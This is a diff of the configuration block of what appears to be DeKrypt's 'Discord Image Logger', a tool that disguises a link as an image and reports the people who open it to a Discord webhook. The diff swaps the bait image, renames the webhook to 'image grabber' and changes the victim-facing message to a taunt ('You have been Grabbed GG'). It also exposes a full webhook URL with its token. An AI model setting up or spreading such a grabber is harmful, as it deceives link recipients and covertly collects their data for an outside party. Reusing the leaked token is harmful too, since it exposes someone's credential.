@@ -13,12 +13,12 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1335326840729894962/ZgN_odU7fzN-Karur-FguXCwXYIenaafz-Kk-TFfpRe0-9srMn-DH_e_3JlKE-KoT8NA",
-    "image": "https://i.guim.co.uk/img/media/02088fb2247b13df646907d47f552dc69a236bc7/0_93_3235_3304/master/3235.jpg?width=445&dpr=1&s=none&crop=none", # You can also have a custom image by using a URL argument
+    "image": "https://static.vecteezy.com/system/resources/thumbnails/027/533/474/small/car-or-bike-smokie-background-realistic-ai-generative-free-photo.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "monkey picture ", # Set this to the name you want the webhook to have
+    "username": "image grabber  ", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "You have been Grabbed GG 🤣🤣", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
